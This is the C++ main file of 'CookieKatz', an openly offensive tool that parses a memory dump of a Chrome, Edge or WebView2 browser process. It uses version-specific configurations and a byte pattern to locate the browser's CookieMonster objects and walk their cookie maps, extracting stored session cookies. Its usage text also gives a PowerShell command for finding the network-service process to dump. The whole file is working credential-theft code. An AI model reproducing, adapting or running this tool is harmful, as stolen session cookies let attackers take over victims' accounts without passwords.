#include "udmp-parser.h"

#define WIN32_LEAN_AND_MEAN 
#include <Windows.h>
#include <stdio.h>
#include "Helper.h"
#include "Memory.h"

void banner() { //This is important
	printf(" _____             _    _      _   __      _       \n");
	printf("/  __ \\           | |  (_)    | | / /     | |      \n");
	printf("| /  \\/ ___   ___ | | ___  ___| |/ /  __ _| |_ ____\n");
	printf("| |    / _ \\ / _ \\| |/ / |/ _ \\    \\ / _` | __|_  /\n");
	printf("| \\__/\\ (_) | (_) |   <| |  __/ |\\  \\ (_| | |_ / / \n");
	printf(" \\____/\\___/ \\___/|_|\\_\\_|\\___\\_| \\_/\\__,_|\\__/___|\n");
	printf("By Meckazin                     github.com/Meckazin \n");
};

void usage() {
	wprintf(L"CookieKatz Minidump parser\n");
	wprintf(L"Usage: \n");
	wprintf(L"    CookieKatzMinidump.exe <Path_to_minidump_file>\n\n");
	wprintf(L"Example:\n");
	wprintf(L"    .\\CookieKatzMinidump.exe .\\msedge.DMP\n\n");
	wprintf(L"To target correct process for creating the minidump, you can use the following PowerShell command: \n");
	wprintf(L"    Get-WmiObject Win32_Process | where {$_.CommandLine -match 'network.mojom.NetworkService'} | select -Property Name,ProcessId \n");
}

int main(int argc, char* argv[]) {

	banner();
	printf("Kittens love cookies too!\n\n");

	if (argc <= 1) {
		usage();
		return EXIT_SUCCESS;
	}

	DWORD result = GetFileAttributesA(argv[1]);
	if (result == INVALID_FILE_ATTRIBUTES) {
		PrintErrorWithMessage(L"Could not find the dump file");
		return EXIT_FAILURE;
	}
	if (result != FILE_ATTRIBUTE_ARCHIVE) {
		wprintf(L"[-] File is not a minidump!\n");
		wprintf(L"    Attributes were: %d\n", result);
		return EXIT_FAILURE;
	}

	printf("[*] Trying to parse the file: %s\n", argv[1]);

	udmpparser::UserDumpParser dump;
	if (!dump.Parse(argv[1])) {
		printf("[-] Failed to parse file: %s\n", argv[1]);
		return EXIT_FAILURE;
	}

	LPCSTR targetDll = "\0";
	uintptr_t dllBaseaddr = 0;
	bool found = false;
	TargetVersion targetConfig = Chrome;
	udmpparser::dmp::FixedFileInfo_t fileInfo = { 0 };

	const auto& Modules = dump.GetModules();
	for (const auto& [Base, ModuleInfo] : Modules) {
		if (ModuleInfo.ModuleName.find("chrome.exe") != std::string::npos) {
			printf("[*] Using Chrome configuration\n\n");
			targetDll = "chrome.dll";
			fileInfo = ModuleInfo.VersionInfo;
			found = true;
			break;
		}
		else if (ModuleInfo.ModuleName.find("msedge.exe") != std::string::npos) {
			printf("[*] Using MSEdge configuration\n\n");
			targetDll = "msedge.dll";
			fileInfo = ModuleInfo.VersionInfo;
			targetConfig = Edge;
			found = true;
			break;
		}
		else if (ModuleInfo.ModuleName.find("msedgewebview2.exe") != std::string::npos) {
			printf("[*] Using MSEdgeWebView configuration\n\n");
			targetDll = "msedge.dll";
			fileInfo = ModuleInfo.VersionInfo;
			targetConfig = Webview2;
			found = true;
			break;
		}
	}

	if (!found) {
		printf("[-] The dump is from unsupported process\n");
		return EXIT_SUCCESS;
	}

	if (dump.GetArch() != udmpparser::ProcessorArch_t::AMD64) {
		printf("[-] Dump is not from x64 process!\n");
		return EXIT_SUCCESS;
	}

	printf("[*] Browser Version: %hu.%hu.%hu.%hu\n\n",
		HIWORD(fileInfo.ProductVersionMS),
		LOWORD(fileInfo.ProductVersionMS),
		HIWORD(fileInfo.ProductVersionLS),
		LOWORD(fileInfo.ProductVersionLS)
	);

	WORD highMajor = HIWORD(fileInfo.ProductVersionMS);
	WORD highMinor = HIWORD(fileInfo.ProductVersionLS);

	//Update config based on target version
	if (targetConfig == Chrome) {
		if (highMajor >= 131 && highMinor >= 6778)
			targetConfig = Chrome;
		else if ((highMajor <= 131 && highMinor < 6778) &&
			(highMajor >= 125 && highMinor > 6387))
			targetConfig = Chrome130;
		else if ((highMajor == 125 && highMinor <= 6387) ||
			(highMajor == 124 && highMinor >= 6329))
			targetConfig = Chrome124;
		else if (highMajor <= 124 ||
			(highMajor == 124 && highMinor < 6329))
			targetConfig = OldChrome;
	}
	else if (targetConfig == Edge || targetConfig == Webview2) {
		if (highMajor >= 131 && highMinor >= 2903)
			targetConfig = Edge;
		else if ((highMajor <= 131 && highMinor < 2903) ||
			(highMajor > 124))
			targetConfig = Edge130;
		else if (highMajor <= 124 ||
			(highMajor == 124 && highMinor < 2478))
			targetConfig = OldEdge;
	}

	//One pattern to rule them all
	size_t szPattern = 192;
	BYTE pattern[] = {
		0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00,
		0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xAA, 0xAA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00,
		0xAA, 0xAA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00,
		0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00, 0xAA, 0xAA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0xAA, 0xAA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0xAA, 0xAA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00,
		0xAA, 0xAA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00,
		0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00,
		0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00, 0xAA, 0xAA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
	};

	for (const auto& [Base, ModuleInfo] : Modules) {
		if (ModuleInfo.ModuleName.find(targetDll) != std::string::npos) {
			dllBaseaddr = ModuleInfo.BaseOfImage;
		}
	}

#ifdef _DEBUG
	PRINT("[+] Found %s in address: 0x%p\n", targetDll, (void*)dllBaseaddr);
#endif
	uintptr_t targetSection = 0;
	if (!FindLargestSection(dump, targetDll, targetSection)) {
		PRINT("[-] Something went wrong");
		return 0;
	}

#ifdef _DEBUG
	PRINTW(L"[+] Found target region in section: 0x%p\n", (void*)targetSection);
#endif
	BYTE chromeDllPattern[sizeof(uintptr_t)];
	ConvertToByteArray(targetSection, chromeDllPattern, sizeof(uintptr_t));

	//Patch in the base address
	PatchPattern(pattern, chromeDllPattern, 8);
	PatchPattern(pattern, chromeDllPattern, 160);

	uintptr_t* CookieMonsterInstances = (uintptr_t*)malloc(sizeof(uintptr_t) * 1000);
	size_t szCookieMonster = 0;
	if (CookieMonsterInstances == NULL || !FindPattern(dump, pattern, szPattern, CookieMonsterInstances, szCookieMonster))
	{
		PRINT("[-] Failed to find pattern\n");
		free(CookieMonsterInstances);
		return 0;
	}

	PRINTW(TEXT("[*] Found %Iu instances of CookieMonster!\n"), szCookieMonster);
#ifdef _DEBUG
	for (size_t i = 0; i < szCookieMonster; i++)
		PRINTW(TEXT("[*] Found CookieMonster on 0x%p\n"), (void*)CookieMonsterInstances[i]);
#endif

	for (size_t i = 0; i < szCookieMonster; i++)
	{
		if (CookieMonsterInstances == NULL || CookieMonsterInstances[i] == NULL)
			break;
		uintptr_t CookieMapOffset = 0x28; //This offset is fixed since the data just is there like it is
		CookieMapOffset += CookieMonsterInstances[i] + sizeof(uintptr_t); //Include the length of the result address as well
		wprintf(TEXT("[*] Found CookieMonster on 0x%p\n"), (void*)CookieMapOffset);
		WalkCookieMap(dump, CookieMapOffset, targetConfig);
	}

	printf("[+] Done");

	return EXIT_SUCCESS;
}